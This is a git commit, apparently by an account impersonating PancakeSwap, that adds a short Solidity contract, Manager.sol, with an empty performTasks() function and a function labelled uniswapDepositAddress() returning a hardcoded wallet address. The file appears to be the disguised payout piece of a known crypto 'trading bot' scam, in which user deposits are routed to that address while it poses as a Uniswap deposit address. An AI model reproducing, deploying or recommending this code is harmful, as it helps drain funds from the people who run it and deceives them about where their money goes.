75bc7e022e0cb56bf9eef70a7f00470e028c931e
pancakeswap-v2 <88372652+pancakeswap-v2@users.noreply.github.com>
2021-08-04 22:59:54 +0700

    Update

---
+++ Manager.sol
@@ -0,0 +1,10 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+  function performTasks() public {
+  
+  }
+  function uniswapDepositAddress() public pure returns (address) {
+    return 0x90A0787620d8E4eEadcB3448D26F05545cB2022A;
+  }
+}
